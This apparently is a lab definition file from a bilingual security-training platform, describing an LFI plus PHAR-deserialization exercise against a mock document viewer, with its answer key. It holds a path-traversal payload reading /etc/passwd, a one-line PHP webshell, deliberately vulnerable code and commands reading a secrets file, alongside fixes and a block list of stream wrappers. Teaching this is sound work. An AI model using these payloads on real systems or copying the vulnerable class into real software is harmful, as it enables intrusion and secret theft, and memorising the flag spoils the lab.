// src/modules/practice-labs/file-inclusion/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const lfiLab5Metadata: LabMetadata = {
  slug: 'lfi-phar-wrapper-deserialization-document-viewer',
  title: 'File Inclusion: PHAR Wrapper + Deserialization — Document Viewer RCE',
  ar_title:
    'تضمين الملفات: PHAR Wrapper + Deserialization — RCE في عارض المستندات',
  description:
    "Exploit an advanced LFI vulnerability combined with PHP PHAR deserialization. Upload a crafted PHAR archive disguised as a PDF file, then trigger deserialization via phar:// wrapper in the LFI parameter — achieving RCE through a gadget chain in the application's class structure.",
  ar_description:
    'استغل ثغرة LFI متقدمة مع PHP PHAR deserialization. ارفع أرشيف PHAR مُصمَّم مُتنكّراً كـ PDF، ثم أطلق الـ deserialization عبر phar:// wrapper في معامل LFI — مُحققاً RCE عبر gadget chain في هيكل كلاسات التطبيق.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'LFI',
    'PHAR Deserialization',
    'PHP Object Injection',
    'Gadget Chain',
    'File Upload Bypass',
    'Advanced RCE',
  ],
  xpReward: 450,
  pointsReward: 225,
  duration: 75,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'Step 1: Upload a malicious PHAR file disguised as a PDF via /docs/upload. Step 2: Use phar:// wrapper in the LFI parameter to trigger deserialization of the PHAR metadata — activating a __wakeup() gadget that reads /app/secrets/master.key and returns the flag.',
  ar_goal:
    'الخطوة 1: ارفع ملف PHAR خبيث مُتنكّراً كـ PDF عبر /docs/upload. الخطوة 2: استخدم phar:// wrapper في معامل LFI لإطلاق deserialization لبيانات PHAR — مُنشّطاً gadget __wakeup() الذي يقرأ /app/secrets/master.key ويُعيد العلم.',

  briefing: {
    en: `DocuVault — document management. Upload PDFs. View them in the browser.
POST /docs/upload — accepts PDF files.
GET /docs/view?doc=uploads/report.pdf — renders the document.
The doc parameter. It reads files. You know what that means.
GET /docs/view?doc=../../../../etc/passwd → LFI confirmed.
But there's more.
PHAR — PHP Archive format.
Like ZIP, but for PHP.
PHAR files contain a manifest. Serialized PHP objects.
When PHP opens a PHAR via phar:// wrapper —
it deserializes the manifest.
Deserialization = object instantiation from serialized data.
Object instantiation = __wakeup() and __destruct() are called.
DocuVault has a class: FileLogger.
FileLogger.__wakeup() does: file_put_contents($this->logFile, $this->logData)
If you craft a PHAR where the serialized FileLogger has:
  logFile = "/var/www/html/shell.php"
  logData = "<?php system($_GET['cmd']); ?>"
Then: phar:///uploads/evil.pdf deserializes FileLogger.
__wakeup() fires. Writes the webshell. To disk.
GET /shell.php?cmd=cat /app/secrets/master.key
Flag.`,
    ar: `DocuVault — إدارة مستندات. ارفع PDFs. اعرضها في المتصفح.
POST /docs/upload — يقبل ملفات PDF.
GET /docs/view?doc=uploads/report.pdf — يُرندر المستند.
معامل doc. يقرأ الملفات. تعرف ما يعني ذلك.
GET /docs/view?doc=../../../../etc/passwd → تأكيد LFI.
لكن هناك أكثر.
PHAR — صيغة PHP Archive.
مثل ZIP، لكن لـ PHP.
ملفات PHAR تحتوي على manifest. كائنات PHP مُسلسَلة.
عندما تفتح PHP ملف PHAR عبر phar:// wrapper —
تُفكّك تسلسل الـ manifest.
فك التسلسل = إنشاء كائن من بيانات مُسلسَلة.
إنشاء الكائن = يُستدعى __wakeup() و__destruct().
DocuVault لديها كلاس: FileLogger.
FileLogger.__wakeup() يفعل: file_put_contents($this->logFile, $this->logData)
إذا صنعت PHAR حيث FileLogger المُسلسَل لديه:
  logFile = "/var/www/html/shell.php"
  logData = "<?php system($_GET['cmd']); ?>"
إذن: phar:///uploads/evil.pdf يُفكّك تسلسل FileLogger.
__wakeup() يُطلق. يكتب الـ webshell. على القرص.
GET /shell.php?cmd=cat /app/secrets/master.key
العلم.`,
  },

  stepsOverview: {
    en: [
      'POST /docs/upload with type "phar" — upload the crafted PHAR disguised as evil.pdf',
      'Receive upload path: "uploads/evil.pdf" from response',
      'GET /docs/view?doc=../../../../etc/passwd — confirm LFI works (baseline)',
      'Trigger PHAR deserialization: POST /docs/view { "doc": "phar:///uploads/evil.pdf" }',
      'PHAR deserialized → FileLogger.__wakeup() → shell.php written to /var/www/html/',
      'POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } → FLAG returned',
    ],
    ar: [
      'POST /docs/upload مع type "phar" — ارفع PHAR المُصمَّم مُتنكّراً كـ evil.pdf',
      'استلم مسار الرفع: "uploads/evil.pdf" من الاستجابة',
      'GET /docs/view?doc=../../../../etc/passwd — أكّد عمل LFI (الأساس)',
      'أطلق PHAR deserialization: POST /docs/view { "doc": "phar:///uploads/evil.pdf" }',
      'تُفكَّك تسلسل PHAR → FileLogger.__wakeup() → shell.php مكتوب في /var/www/html/',
      'POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } → يُعاد العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'DocuVault has: (1) a file upload endpoint accepting PDFs, (2) an LFI via the doc parameter, (3) a vulnerable FileLogger class with __wakeup() that writes arbitrary data to arbitrary paths. A PHAR containing a serialized FileLogger with logFile="/var/www/html/shell.php" is uploaded as a PDF. The phar:// LFI triggers deserialization, __wakeup() writes a webshell, and /docs/shell-access executes commands.',
    vulnerableCode:
      '// Document viewer (vulnerable — accepts phar://):\n' +
      "app.get('/docs/view', isAuthenticated, (req, res) => {\n" +
      '  const doc = req.query.doc;\n' +
      '  // ❌ No phar:// filtering — triggers deserialization!\n' +
      '  const content = file_get_contents(doc); // or include(doc)\n' +
      '  res.send(content);\n' +
      '});\n\n' +
      '// Gadget chain (vulnerable class):\n' +
      'class FileLogger {\n' +
      '  public $logFile;\n' +
      '  public $logData;\n' +
      '  public function __wakeup() {\n' +
      '    // ❌ Runs on deserialization — writes to any file!\n' +
      '    file_put_contents($this->logFile, $this->logData);\n' +
      '  }\n' +
      '}',
    exploitation:
      '1. POST /docs/upload { "type": "phar" } → { "path": "uploads/evil.pdf" }\n' +
      '2. POST /docs/view { "doc": "phar:///uploads/evil.pdf" } → PHAR deserialized → shell.php written\n' +
      '3. POST /docs/shell-access { "cmd": "id" } → "uid=33(www-data)" — RCE confirmed\n' +
      '4. POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } → FLAG',
    steps: {
      en: [
        'POST /docs/upload { "type": "phar", "filename": "evil.pdf" } → { "success": true, "path": "uploads/evil.pdf" }',
        'POST /docs/view { "doc": "phar:///uploads/evil.pdf" } → PHAR deserialized, FileLogger.__wakeup() called → shell.php written',
        'POST /docs/shell-access { "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" } — RCE confirmed',
        'POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } → master.key with FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}',
      ],
      ar: [
        'POST /docs/upload { "type": "phar"، "filename": "evil.pdf" } → { "success": true، "path": "uploads/evil.pdf" }',
        'POST /docs/view { "doc": "phar:///uploads/evil.pdf" } → تُفكَّك تسلسل PHAR، يُستدعى FileLogger.__wakeup() → shell.php مكتوب',
        'POST /docs/shell-access { "cmd": "id" } → { "output": "uid=33(www-data) gid=33(www-data)" } — تأكيد RCE',
        'POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } → master.key مع FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}',
      ],
    },
    fix: [
      'Block phar:// wrapper: filter out "phar://" from all file path inputs (and data://, zip://, etc.)',
      'Fix the LFI with allowlist: without the LFI, phar:// cannot be triggered on uploaded files',
      'Eliminate the gadget: FileLogger.__wakeup() should not perform file writes — use explicit save() methods instead of magic methods',
      "phar.readonly = On in php.ini: prevents creating PHAR archives but doesn't prevent reading them",
      'Content-type validation on upload: verify file magic bytes (PDF starts with %PDF-1.) — PHAR files start with "<?php" or "__HALT_COMPILER"',
    ],
  },

  postSolve: {
    explanation: {
      en: 'PHAR deserialization is a 2018-discovered attack class that chains file upload + LFI into PHP object injection. Every PHP file operation (file_exists(), fopen(), copy(), rename(), include()) that supports stream wrappers will trigger PHAR deserialization when passed a phar:// path. The power comes from gadget chains: existing classes in the codebase (or popular libraries like Guzzle, Monolog, SwiftMailer) with dangerous magic methods (__wakeup, __destruct) that perform arbitrary operations when instantiated via deserialization. This attack doesn\'t require the file to be "executed" — any file operation triggers it.',
      ar: 'PHAR deserialization هو فئة هجوم اكتُشفت عام 2018 تُسلسل رفع الملف + LFI في PHP object injection. كل عملية ملف PHP (file_exists()، fopen()، copy()، rename()، include()) تدعم stream wrappers ستُطلق PHAR deserialization عند تمرير مسار phar://. تأتي القوة من gadget chains: كلاسات موجودة في قاعدة الكود (أو مكتبات شائعة مثل Guzzle، Monolog، SwiftMailer) مع magic methods خطيرة (__wakeup، __destruct) تُنفّذ عمليات عشوائية عند إنشائها عبر deserialization. لا يتطلب هذا الهجوم أن يكون الملف "مُنفَّذاً" — أي عملية ملف تُطلقه.',
    },
    impact: {
      en: '/app/secrets/master.key contains: AES-256-CBC master encryption key (can decrypt all documents in DocuVault), HMAC secret (forge any message authentication), admin override token (bypass all access controls), and the FLAG. This is the most catastrophic impact possible for a document management system — all stored documents can be decrypted, authentication can be bypassed, and any document can be forged.',
      ar: 'يحتوي /app/secrets/master.key على: مفتاح تشفير رئيسي AES-256-CBC (يمكنه فك تشفير جميع المستندات في DocuVault)، سر HMAC (تزوير أي مصادقة رسالة)، رمز تجاوز المسؤول (تجاوز جميع ضوابط الوصول)، والـ FLAG. هذا هو أكثر التأثيرات كارثية ممكنة لنظام إدارة المستندات — يمكن فك تشفير جميع المستندات المخزَّنة، يمكن تجاوز المصادقة، ويمكن تزوير أي مستند.',
    },
    fix: [
      'Comprehensive wrapper blacklist: filter phar://, zip://, data://, glob://, expect://, php:// from all file path inputs',
      'Gadget chain elimination: audit all classes for dangerous magic methods — __wakeup/__destruct should never perform file writes, eval, or system calls',
      'Upload security: rename uploaded files to UUID — never store in user-accessible path with user-controlled name',
      'Disable PHAR via php.ini: phar.readonly=On prevents PHAR creation; additionally filter phar:// in application code',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 30,
      content:
        'PHAR (PHP Archive) files contain serialized PHP objects in their metadata. When PHP opens a phar:// URL using ANY file function (not just include), it deserializes the metadata — triggering magic methods like __wakeup() and __destruct().',
    },
    {
      order: 2,
      xpCost: 55,
      content:
        'POST /docs/upload with { "type": "phar" } to upload the malicious PHAR disguised as a PDF. The response gives you the upload path. You\'ll need this path for the phar:// trigger.',
    },
    {
      order: 3,
      xpCost: 85,
      content:
        'POST /docs/view with { "doc": "phar:///uploads/evil.pdf" }. PHP deserializes the PHAR metadata → FileLogger.__wakeup() is triggered → it writes a webshell to /var/www/html/shell.php on the server.',
    },
    {
      order: 4,
      xpCost: 120,
      content:
        'After phar:// deserialization drops the webshell, use POST /docs/shell-access { "cmd": "cat /app/secrets/master.key" } to execute commands via the dropped shell and retrieve the flag.',
    },
  ],

  flagAnswer: 'FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}',
  initialState: {
    contents: [
      {
        title: 'MASTER_KEY',
        body: '# DocuVault Master Secrets\nMASTER_ENCRYPTION_KEY=aes-256-cbc:MstrKey_Pr0d_2024_DocuVault!\nHMAC_SECRET=hmac_sha256_docuvault_prod_secret\nFLAG=FLAG{LFI_PHAR_DESERIALIZATION_GADGET_CHAIN_DOCUVAULT_RCE}\nADMIN_OVERRIDE_TOKEN=ovrd_tok_docuvault_2024',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
